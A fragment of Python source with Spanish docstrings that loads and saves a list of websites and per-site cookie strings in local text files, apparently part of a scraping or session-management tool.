def load_webs():
    """Carga la lista de webs desde el archivo"""
    default_webs = ["uavionix.com", "whitmancontrols.com"]
    
    if os.path.exists(WEBS_FILE):
        with open(WEBS_FILE, 'r') as f:
            webs = [line.strip() for line in f if line.strip()]
            if webs:
                return webs
    
    with open(WEBS_FILE, 'w') as f:
        for web in default_webs:
            f.write(web + '\n')
    
    return default_webs

def save_webs(webs):
    """Guarda la lista de webs en el archivo"""
    with open(WEBS_FILE, 'w') as f:
        for web in webs:
            f.write(web + '\n')

def load_all_cookies():
    """Carga todas las cookies del archivo cookies.txt y las devuelve como lista"""
    cookies_list = []
    if os.path.exists(COOKIES_TXT_FILE):
        with open(COOKIES_TXT_FILE, 'r') as f:
            for line in f:
                line = line.strip()
                if line and '=' in line:
                    try:
                        web, cookie_str = line.split('=', 1)
                        cookies_list.append({
                            'web': web.strip(),
                            'cookies': cookie_str.strip()
                        })
                    except:
                        continue
    return cookies_list

def save_all_cookies(cookies_list):
    """Guarda todas las cookies en el archivo cookies.txt"""
    with open(COOKIES_TXT_FILE, 'w') as f:
        for cookie_item in cookies_list:
            f.write(f"{cookie_item['web']}={cookie_item['cookies']}\n")

